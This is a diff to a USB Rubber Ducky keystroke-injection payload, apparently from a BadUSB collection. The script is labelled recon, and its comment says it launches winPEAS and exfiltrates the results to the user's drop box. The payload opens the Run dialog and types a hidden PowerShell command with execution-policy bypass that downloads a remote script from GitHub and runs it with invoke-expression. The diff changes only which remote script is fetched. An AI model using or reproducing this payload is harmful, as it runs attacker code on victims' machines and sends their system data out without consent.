@@ -7,5 +7,5 @@ REM Category: Recon
 REM Launches winpeas and exfils to your drop box.
 GUI r
 DELAY 1500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/FalsePhilosopher/BadUSB-Playground/main/Ducky/USBRubberducky/library/recon/Win/Winpeas/WP.ps1 ?dl=1; invoke-expression $pl
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/FalsePhilosopher/BadUSB-Playground/main/Ducky/USBRubberducky/library/recon/Win/Winpeas/WPDBE.ps1 ?dl=1; invoke-expression $pl
 ENTER
